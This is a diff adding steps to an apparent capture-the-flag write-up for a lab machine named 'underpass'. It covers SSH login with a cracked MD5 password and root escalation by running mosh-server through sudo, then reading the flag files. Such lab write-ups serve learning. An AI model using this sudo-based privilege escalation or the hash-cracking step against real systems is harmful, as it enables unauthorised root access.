@@ -40,7 +40,13 @@ go to User List and you will find username and a hashed MD5 password, copy the M
 Website: https://crackstation.net/
 
 # User.txt
+use the username and password to login through SSH
 
+Command: svcMosh@underpass.htb
+
+Then add the password you cracked before !
+
+after logging in run ls command and you will see user.txt , and then run 'cat user.txt' now you have the user flag YAYAY!!
 
 # Root Flag
 using the command sudo -l this help me list the current user privileges level , I find that the mosh-server doesnot need root privilege and I am able to go inside this directory.
@@ -49,3 +55,12 @@ using these command one by one will give you access to mosh-server:
 
 - sudo /usr/bin/mosh-server new -p 61113
 - MOSH_KEY=<Key> mosh-client 127.0.0.1 61113
+
+now run these command:
+
+- whoami
+- cd /root
+- ls -la
+- cat root.txt
+
+YAY YOU HAVE THE ROOT FLAG !!!!
